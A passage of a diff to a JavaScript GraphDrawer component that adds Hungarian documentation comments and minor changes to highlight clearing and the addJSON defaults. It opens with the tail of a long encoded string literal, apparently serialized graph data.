lswGlcnFoFxFaWxVyO2GxWxVyMbBTBLFTc4BTBLFlcnFlonFbBwBTM4FTc4BTBLFlsnFoFwGlsnFoFyFxWxVyO3GAWxVyF2BTM5BTGAJRWxSLO4FAWxVyF5BTBLFTsyBTBLGLHnFoFwSLcnFoFbFAWxSRWyVuOnFlswSTHnFoFbFAWxVyO5FAWxVyVqBTBLFToyBTBLFyonFlonFbBwBTM4FTo1BTBLFysnFoFwSTsnFoFyGAWxVyO5SAWxVyFbBTM5BTGAJAWxSLO5SAWxVyF4BTM5BTGAIAWxSAWxSRWyVeinFlswSTOnFoF3SRWxVxW1VaW1VlO5FRWxVyJ5BTBLFToxBTBLGyonFoFwSTFnFoF3GxW1QAWxVxW1VlO5GAWxVyJ1BTBLFToyBTBLGyFnFoFwSTVnFoF3FRW1QAWxVxW1VlO5GRWxVyJqBTBLFTo3BTBLGlsnFoFwSTJnFoF2GRW1QAWxVxW1VlO5GxWxVycxBTBLFTo2BTBLGlVnFoFwSTJnFoF2FRW1QAWxVxW1VlO5SAWxVyW4BTBLFTo5BTBLGlHnFoFwSTonFoF1GaW1QAWxVxW1VlO5SAWxVyWxBTBLFTo3BTBLGTHnFoFwSTsnFoFbGxW1QAWxVxW1VlO5SRWxVyVbBTBLFlHqBTBLGLVnFoFwSTonFoFbFRW1QAWxVxW1VlO5SRWxVyF5BTBLFTo3BTBLFyJnFoFwSTJnFoFyGxW1QAW1QAWxSRWyVe+nFlswSTonFoFxGAWxVxW1VaW1VlO5SRWxVyVqBTXOBTXOBTM5BTGAfxWxSLO2GRWxVyO4BTBLBTXABTXAFTc1BTBLFTsnFoFwGlJnFoFxFAWxVyO2SRWxVyO4BTXOBTBLBTXAFTJxBTBLFTJnFoFwGyVnFoFwGxWxVyO3SAWxVyO3BTXOBTBLBTXAFTswBTBLFTJnFoFwSLWnFoFwGxWxVyO5FAWxVyO5BTXOBTBLBTXAFTo2BTBLFlOnFoFwSTonFoFxGAWxVyO5SRWxVyMbBTXOBTXOBTM5BTGAfxWxSLOxSRWxVyM5BTBLBTXABTXAFTM5BTBLFlonFoFwFlonFoFxGAWxVyOyFAWxVyMwBTXOBTBLBTXAFTFqBTBLFTsnFoFwFyHnFoFwGRWxVyOyFxWxVyO1BTXOBTBLBTXAFTF2BTBLFTWnFoFwFycnFoFwFxWxVyObGRWxVyOyBTXOBTBLBTXAFTWbBTBLFTFnFoFwGTFnFoFwGAWxVyO1GxWxVyO2BTXOBTBLBTXAFTcxBTBLFTsnFoFwGlWnFoFwSAWxVyO2GRWxVyO4BTXOBTXOBTM5BTGAfxWxSLObGRWxVyO1BTBLBTXABTXAFTV1BTBLFTWnFoFwFysnFoFwFxWxVyOyGRWxVyO3BTXOBTBLBTXAFTFwBTBLFlHnFoFwFyMnFoFwSRWxVyOyFRWxVyMyBTXOBTBLBTXAFTFwBTBLFlJnFoFwFyMnFoFxSAWxVyOyGRWxVyFqBTXOBTBLBTXAFTF3BTBLFyMnFoFwGLsnFoFyFxWxVyO1FRWxVyFwBTXOBTBLBTXAFTW1BTBLFlsnFoFwGTonFoFxGAWxVyO1SRWxVyMqBTXOBTBLBTXAFTW5BTBLFTJnFoFwGTJnFoFwGaWxVyO1FxWxVyO2BTXOBTBLBTXAFTWqBTBLFTWnFoFwGLWnFoFwGRWxVyObGRWxVyO1BTXOBTXOBTBLrUB1dRWxSRWyVeinFlswSLVnFoFwSRWxVxW1VaW1VlO4GAWxVyO5BTBLFTowBTBLFlHnFoFwSTVnFoFxFxW1QAWxVxW1VlO5GxWxVyM3BTBLFTo3BTBLFlonFoFwSTcnFoFyFxW1QAWxVxW1VlO5GRWxVyF3BTBLFToyBTBLFyonFoFwSLFnFoFyGxW1QAWxVxW1VlO3FaWxVyFbBTBLFTJwBTBLFyFnFoFwGlonFoFxSAW1QAWxVxW1VlO2SAWxVyMyBTBLFTc4BTBLFlHnFoFwGyMnFoFwSRW1QAWxVxW1VlO3GRWxVyO4BTBLFTsbBTBLFTonFoFwSLVnFoFwSRW1QAW1QAWxSRWyVeinFlswGLMnFoFwFaWxVxW1VaW1VlObFaWxVyOxBTBLFTV4BTBLSRWxVyO1FaWxVyOqBTXOBTBLBTXAFTW3BTBLFTMnFoFwGTcnFoF4BTBLFTW5BTBLSAW1QAWxVxW1VlO2FaWxVyonFoFwGlMnFoFwFaWxVyO2GaWxVyOxBTXOBTBLBTXAFTJwBTBLFTFnFoFwGyWnFoFwFRWxVyO3SAWxVyOxBTXOBTBLBTXAFTsxBTBLFTFnFoFwSLVnFoFwFaWxVyO4GaWxVyObBTXOBTBLBTXAFTs3BTBLFTcnFoFwSLsnFoFwSRWxVyO4SAWxVyO5BTXOBTXOBTM5BTGAfxWxSLO5SAWxVyOxGRWxVxW1VaW1VlO5SAWxVyOxGRWxVyO5FaWxVyOwFRWxVyO5FaWxVyo3BTXOBTBLBTXAFToxBTBLSLVnFoFwSTcnFoF3GRWxVyMqFAWxVyJyBTXOBTBLBTXAFlHbBTBLGyMnFoFxFLJnFoF3FaWxVyMqGxWxVyJxBTXOBTBLBTXAFlH3BTBLGyMnFoFwSTonFoF3GRWxVyO5GxWxVysxBTXOBTBLBTXAFTo1BTBLSLsnFoFwSTWnFoFwFLOnFoFwSTJnFoFwFLonGWVnFoFnGWMwSTonFoFwFTJnFoFxFLHnFoFwFlVnFoFxFLHnFoFwFlVnGWVnGWVnFoGbJuXnBTM5BTGAfxWxSLMqGaWxVyJxBTBLBTXABTXAFlH2BTBLGyMnFoFxFTMnFoF3FRWxVyMwSAWxVyJ1BTXOBTBLBTXAFlMyBTBLGysnFoFxFlFnFoF3SAWxVyMxFxWxVyJ4BTXOBTXOBTM5BTGAfxWxSLO3SAWxVyOxFAWxVxW1VaW1VlO3SAWxVyOxFAWxVyO4FRWxVyOwGxWxVyO4FaWxVyOwFaW1QAWxVxW1VlO4FxWxVyOqSAWxVyO4FaWxVyOqGaWxVyO4FaWxVyOqGaW1QAW1QAWxSRWyVeinFlswSLHnFoFwGLHnFoFnGWMnGWMwSLHnFoFwGLHnFoFwSLFnFoFwGLMnFoFwSLFnFoFwGLHnGWVnFoFnGWMwSLMnFoFwFyonFoFwSLOnFoFwFycnFoFwSLMnFoFwFycnGWVnFoFnGWMwSLVnFoFwFyJnFoFwSLsnFoFwFyonFoFwSLcnFoFwFyJnGWVnFoFnGWMwSLWnFoFwFyVnFoFwSLMnFoFwFyHnFoFwSLWnFoFwFyMnGWVnFoFnGWMwSLsnFoFwFyFnFoFwSTHnFoFwFyVnFoFwSLonFoFwFyMnGWVnFoFnGWMwSLonFoFwFyHnFoFwSLsnFoFwFlsnFoFwSTHnFoFwFlonGWVnFoFnGWMwSTOnFoFwFyOnFoFwSTVnFoFwFyHnFoFwSTFnFoFwFlonGWVnFoFnGWMwSTOnFoFwFlJnFoFwSTMnFoFwFlcnFoFwSTFnFoFwFlsnGWVnFoFnGWMwSTWnFoFwFlonFoFwSTcnFoFwFlonFoFwSTWnFoFwFlcnGWVnFoFnGWMwSTVnFoFwFlVnFoFwSTWnFoFwFlVnFoFwSTcnFoFwFlWnGWVnFoFnGWMwSTsnFoFwFlJnFoFxFLOnFoFwFlcnFoFwSTonFoFwFlVnGWVnFoFnGWMwSTJnFoFwFlOnFoFwSTcnFoFwFlHnFoFxFLHnFoFwFlMnGWVnFoFnGWMxFLVnFoFwFlFnFoFxFLVnFoFwFlOnFoFxFLMnFoFwFTonGWVnFoFnGWMxFLHnFoFwFTcnFoFxFLOnFoFwFTMnFoFxFLFnFoFwFTcnGWVnFoFnGWMxFLVnFoFwFTonFoFxFLonFoFwFTcnFoFxFLcnFoFwFTFnGWVnFoFnGWMxFLFnFoFwFLonFoFxFLFnFoFwFLJnFoFxFLcnFoFwFLonGWVnFoFnGWMxFLsnFoFwFTOnFoFxFLonFoFwFLonFoFxFLsnFoFwFLcnGWVnFoFnGWMxFLJnFoFwFLVnFoFxFLcnFoFwFLMnFoFxFLsnFoFwFLFnGWVnFoFnGWMxFTOnFoFwFLVnFoFxFTMnFoFwFLVnFoFxFTOnFoFwFLMnGWVnFoFnGWMxFLonFoFwFLOnFoFxFTHnFoF5SRWxVyMwFaWxVyOqFAW1QAWxVxW1VlMwFxWxVyOqFaWxVyMwGAWxVyOqFRWxVyMwFxWxVyo5BTXOBTBLBTXAFlOxBTBLSTcnFoFxFTVnFoF5GAWxVyMwGRWxVyo1BTXOBTBLBTXAFlO3BTBLSTJnFoFxFTonFoF5GAWxVyMwSRWxVyoyBTXOBTBLBTXAFlO4BTBLSTOnFoFxFTsnFoF4SAWxVyMxFAWxVys4BTXOBTBLBTXAFlMxBTBLSLsnFoFxFlMnFoF4SRWxVyMxGAWxVys4BTXOBTBLBTXAFlM2BTBLSLJnFoFxFyOnFoF4GaWxVyMxGxWxVysbBTXOBTBLBTXAFlMxBTBLSLFnFoFxFlFnFoF4FaWxVyMxGAWxVyswBTXOBTBLBTXAFlM2BTBLSLHnFoFxFlsnFoF3GxWxVyMxGRWxVyJ4BTXOBTBLBTXAFlMxBTBLSLHnFoFxFlFnFoF3GxWxVyMxGRWxVyJ2BTXOBTBLBTXAFlM4BTBLGyWnFoFxFlcnFoF3FxWxVyMxGAWxVyJ1BTXOBTBLBTXAFlMwBTBLGyJnFoFxFTonFoF3GaWxVyMxFRWxVyJ1BTXOBTBLBTXAFlMxBTBLGyFnFoFxFlHnFoF3FaWxVyMxFAWxVyJbBTXOBTBLBTXAFlO5BTBLGyJnFoFxFTonFoF3GaWxVyMwSRWxVyJ2BTXOBTXOBTM5BTGAfxWxSLOxFAWxVyo3BTBLBTXABTXAFTMqBTBLSTJnFoFwFlMnFoF5GAWxVyOxGAWxVyobBTXOBTBLBTXAFTM3BTBLSTFnFoFwFlsnFoF5FxWxVyOxSAWxVyoyBTXOBTXOBTM5BTGAfxWxSLOxFAWxVyo5BTBLBTXABTXAFTMqBTBLSTonFoFwFlVnFoF5SRWxVyOxGxWxVyOqFAW1QAWxVxW1VlOxSRWxVyOqFAWxVyOyFAWxVyOqFRWxVyOyFAWxVyOqFRW1QAW1QAWxSRWyVe+nFlswGlsnFoFwGTJnFoFnGWMnGWMwGyMnFoFwGyMnGWVnGWVnFlonFbBhBTM4FyOnFoF5SAWxVxW1VaW1VlFwBTBLSTsnFoFxGaWxVyOqFAWxVyMxBTBLFTHbBTXOBTBLBTXAFTonFoFwFLsnFoFwGxWxVyOwSRWxVyO3BTBLFTO5BTXOBTXOBTM5BTGAfaWxSLMxBTBLFTHbBTBLBTXABTXAFTVnFoFwFLonGWVnGWVnFlonFbBhBTM4FyonFoFwFlcnFoFnGWMnGWMySRWxVyOxGaWxVyV3BTBLFTVxBTBLGTHnFoFwGLcnGWVnFoFnGWM1FxWxVyO1FRWxVycbBTBLFTW5BTBLGlsnFoFwGlWnGWVnFoFnGWM3FaWxVyO3FAWxVyJyBTBLFTJyBTBLGyFnFoFwGyFnGWVnFoFnGWM3FxWxVyO3FxWxVyJ2BTBLFTc3BTBLGyJnFoFwGlWnGWVnFoFnGWM3SAWxVyO2FxWxVyJ5BTBLFTcwBTBLGyonFoFwGlOnGWVnGWVnFlonFbBhBTM4FysnFoFwGTHnFoFnGWMnGWMySRWxVyO1FAWxVyWwBTBLFTV5BTBLGTOnFoFwGLonGWVnFoFnGWM1FRWxVyObSRWxVyW1BTBLFTWxBTBLGTWnFoFwGTVnGWVnFoFnGWM1GAWxVyO1GaWxVyWqBTBLFTW4BTBLGTWnFoFwGlOnGWVnFoFnGWM1SRWxVyO2GAWxVyc5BTBLFTc4BTBLGlonFoFwGlsnGWVnGWVnFlonFbBhBTM4FlJnFoF1SRWxVxW1VaW1VlMbBTBLGTcnFoFxGRWxVyW2BTBLFlcnFoF1FaW1QAWxVxW1VlM2BTBLGLsnFoFxFxWxVyVbBTBLFlVnFoFbFaW1QAWxVxW1VlM1BTBLGLOnFoFxFRWxVyF4BTBLFlFnFoFyFxW1QAWxVxW1VlM2BTBLFlsnFoFxGAWxVyM2BTBLFlsnFoFxFAW1QAWxVxW1VlFyBTBLFTFnFoFySRWxVycnFoFySRWxVycnGWVnGWVnFlonFbBqBTM4GLOnFoFyBTM5BTGAIAWxSAWxSRWyVeinFlswFlOnFoF2FAWxVxW1VaW1VlOxFAWxVyW5BTBLFTMxBTBLGTonFoFwFlMnFoF1FxW1QAWxVxW1VlOxFaWxVyV2BTBLFTMbBTBLGLonFoFwFlVnFoFbFxW1QAWxVxW1VlOxGRWxVyF4BTBLFTM3BTBLFycnFoFwFlWnFoFyFAW1QAWxVxW1VlOxFaWxVyM1BTBLFTMyBTBLFTonFoFwFlHnFoFwGaW1QAWxVxW1VlOwGxWxVyOxBTBLFTOxBTBLSAWxVyOwFAWxVyWnGWVnFoFnGWMwFLJnFoFwBTBLFTHbBTBLFAWxVyOqGAWxVyHnGWVnGWVnFlonFbBhBTM4GLFnFoFbSRWxVxW1VaW1VlVyBTBLGLonFoFyGaWxVyWwBTBLFyWnFoF1GAW1QAWxVxW1VlFyBTBLGTcnFoFyFxWxVyW2BTBLFyFnFoF1GaW1QAW1QAWxSRWyVeinFls1GaWxVyMqBTBLBTXABTXAGTcnFoFxFAWxVycbBTBLFTonFoF2SRWxVyMxBTXOBTBLBTXAGyVnFoFxGRWxVyJ2BTBLFlFnFoF4FAWxVyM1BTXOBTBLBTXASLVnFoFxGxWxVys3BTBLFlOnFoF4GaWxVyFwBTXOBTBLBTXASLWnFoFbFAWxVysyBTBLGLFnFoF4FxWxVyVyBTXOBTXOBTM5BTGAJAWxSLsyBTBLGLFnFlonFbBiBTM4BTM5BTGAfxWxSLs4BTBLFlJnFoFnGWMnGWM4SAWxVyM3BTBLSTOnFoFxSRWxVyowBTBLFyMnGWVnFoFnGWM5FRWxVyF1BTBLSTHnFoFySRWxVyoqBTBLGLMnGWVnFoFnGWM4SRWxVyV2BTBLSTOnFoF1FRWxVyowBTBLGTOnGWVnGWVnFlonFbBhBTM4STMnFoFxSRWxVxW1VaW1VloxBTBLFlonFoF5FxWxVyF1BTBLSTWnFoFySAW1QAWxVxW1Vlo2BTBLGLMnFoFwFLHnFoFbSAWxVyOqFAWxVyV4BTXOBTXOBTM5BTGAfxWxSLo2BTBLFyOnFoFnGWMnGWM5GaWxVyFwBTBLFTHwBTBLFyMnFoFwFLFnFoFyGaW1QAWxVxW1VlOqGRWxVyVqBTBLFTHbBTBLGLWnFoFwFLVnFoFbGRW1QAW1QAWxSRWyVeinFlswFLWnFoFySAWxVxW1VaW1VlOqGRWxVyF4BTBLFTOqBTBLFysnFoFwFLonFoFbFRW1QAWxVxW1VlOqSAWxVyV1BTBLFTH1BTBLGLonFoFwFLJnFoF1FRW1QAWxVxW1VlOwFAWxVyWyBTBLFTObBTBLGTVnFoFwFTVnFoF1GAW1QAW1QAWxSRWyVeinFlswFTHnFoFbFaWxVxW1VaW1VlOwFAWxVyVxBTBLFTOxBTBLGLVnFoFwFTMnFoFbGxW1QAWxVxW1VlOwFaWxVyV5BTBLFTOxBTBLGLonFoFwFTMnFoFbSRW1QAW1QAWxSRWyVeinFlswFTFnFoFbGAWxVxW1VaW1VlOwFxWxVyVbBTBLFTObBTBLGLsnFoFwFTcnFoFbSRW1QAWxVxW1VlOwSAWxVyV5BTBLFTMqBTBLGTHnFoFwFlHnFoF1FAW1QAW1QAWxSRWyVeinFls1GAWxVyMqBTBLBTXABTXAGTVnFoFxFAWxVyV5BTBLFlMnFoF1FAWxVyM2BTXOBTBLBTXAGTOnFoFyFAWxVyWqBTBLFyMnFoF1FAWxVyFxBTXOBTXOBTM5BTGAfxWxSLV4BTBLFlVnFoFnGWMnGWMbSAWxVyMbBTBLGLWnFoFxFaWxVyV2BTBLFlcnGWVnFoFnGWMbGaWxVyFqBTBLGTMnFoFyFaWxVyWqBTBLFycnGWVnFoFnGWMbSRWxVyVqBTBLGLJnFoFbFRWxVyV3BTBLGLOnGWVnGWVnFlonFbBhBTM4GLFnFoFxSRWxVxW1VaW1VlVyBTBLFlonFoFySRWxVyFxBTBLFyonFoFyGAW1QAWxVxW1VlVqBTBLFycnFoFbGAWxVyF3BTBLGLMnFoFySRW1QAWxVxW1VlF5BTBLGLOnFoFyGaWxVyVxBTBLFycnFoFbFaW1QAW1QAWxSRWyVe8nFlsnFlonGbQzDewgIeXLc0HnFbVnFlrxI3XkdAWxGxWyVeOkIEnkdWgpfY4nFbVnFlrxI3XkdAWxGxWyVeOkIYnbd0BFfY1grAWyQLOqBTGAcR5ifY5nX2norEsnFbV1BTGAcR5yrUBpf2XTrUnidRWyQAWxGxWxF2dedededaWxGxWyVeWnFlsnFlonFbBzDewgIeX0fYQbfAWyQLOnFbBzDuGbJe9hdXGbPYwnBTGOBTM3BTMyFLHqFLHqBTM3BTGAdRWxSAWxSRWyVeVkdeniINGbPYwnBTGOBTM3BTMyFLHqFLHqBTM3BTGAdA5efYwiXEX4rAWxSAWxG1G6cYwpIe5zBTMqBWW5JxWxFOGgc2OnFlJnFoFxGLHnFoFbGTHnFlonFbBoDeQxc0rBIYNudRWxSEFnFoFxFAWxVyM5FAWxSRWyVaW3QAW3QAWxSRWxSEGbPAWxSVKK"));
 	}
 
+	/**
+	 * Gráf kirajzolása
+	 *
+	 * @method draw
+	 */
 	this.draw = function(){
 		var size = items.getGraphSize();
 		canvas.width = size.width;
@@ -749,6 +1088,12 @@ var GraphDrawer = function(container){
 		
 	}
 
+	/**
+	 * Ráépülők állapotának alaphelyzetbe állítása.
+	 * 
+	 * @method clearFollows
+	 * @param {String} id Elem azonosító
+	 */
 	this.clearFollows = function(id){
 		var follows = items.getFollows(id);
 
@@ -762,29 +1107,60 @@ var GraphDrawer = function(container){
 		EventBus.dispatch("redrawItem", this, id);
 	}
 
+	/**
+	 * Újrarajzolás esemény kezelő
+	 *
+	 * @method redrawEventHandler
+	 * @param {Object} eventarg
+	 * @param {String} arg Elem azonosító
+	 */
 	this.redrawEventHandler = function(eventarg, arg){
+
 		this.drawItem(arg);
 	}
 
+	/**
+	 * Kurzor alaphelyzetbe állító esemény kezelése.
+	 *
+	 * @method clearCursorEventHandler
+	 */
 	this.clearCursorEventHandler = function(){
 		canvas.style.cursor = "default";
 		EventBus.dispatch("clearHighlights", this);
 	}
 
+	/**
+	 * Kiemelés törlés esemény kezelő
+	 *
+	 * @method clearHighlightEventHandler
+	 */
 	this.clearHighlightsEventHandler = function(){
 		var itemList = items.getItems();
 		for(var i = 0; i < itemList.length; i++){
-			if(itemList[i].properties.highlight){
+			if(itemList[i].properties.highlight || itemList[i].properties.pendent){
 				itemList[i].properties.highlight = false;
+				itemList[i].properties.pendent   = false;
 				EventBus.dispatch("redrawItem", this, itemList[i].id);
 			}
 		}
 	}
 
+	/**
+	 * Összeállítás állapotkódjának előállítása
+	 *
+	 * @method serialize
+	 * @return {String} Állapotkód
+	 */
 	this.serialize = function(){
 		return items.serialize();
 	}
 
+	/**
+	 * Állapotkód alapján állapot helyreállítása
+	 *
+	 * @method unserialize
+	 * @param {String} data Állapotkód
+	 */
 	this.unserialize = function(data){
 		items.unserialize(data);
 	}
@@ -802,12 +1178,37 @@ var GraphDrawer = function(container){
 		this.draw();
 	}, this);
 
-	this.click = function(){};
-	this.hovered = function(){};
+	/**
+	 * Publikus kattintás esemény.
+	 *
+	 * @method click
+	 * @param {Object} item Kattintott elem
+	 * @param {Object} eventarg
+	 */
+	this.click = function(item, eventarg){};
 
+	/**
+	 * Publikus hover esemény
+	 *
+	 * @method click
+	 * @param {Object} item Egér alatt lévő elem
+	 */
+	this.hovered = function(item){};
+
+	/**
+	 * Tömeges adathozzáadás
+	 *
+	 * @method addJSON
+	 * @param {Object} data Adatokat tartalmazó JSON objektum
+	 * @param {Boolean} [clear=true] Törölje-e az előzőleg hozzáadott elemeket
+	 */
 	this.addJSON = function(data, clear){
 		if(data.items == undefined || data.items.length == 0){
 			return;
+		}
+
+		if(clear == undefined){
+			clear = true;
 		}
 
 		if(clear == true){
@@ -829,6 +1230,12 @@ var GraphDrawer = function(container){
 		}
 	}
 
+	/**
+	 * Elemek lekérdezése. Hozzáfűződik egy 'active' érték attól függően, hogy teljesített-e vagy sem.
+	 *
+	 * @method getItems
+	 * @return {Array} Elemek listája
+	 */
 	this.getItems = function(){
 		var itemList = items.getItems(),
 			returnList = new Array();
@@ -844,6 +1251,11 @@ var GraphDrawer = function(container){
 		return returnList;
 	}
 
+	/**
+	 * Összeállítás törlése, elemek alapállapotba helyezése.
+	 *
+	 * @method clearSelection
+	 */
 	this.clearSelection = function(){
 		items.clearSelection();
 	}
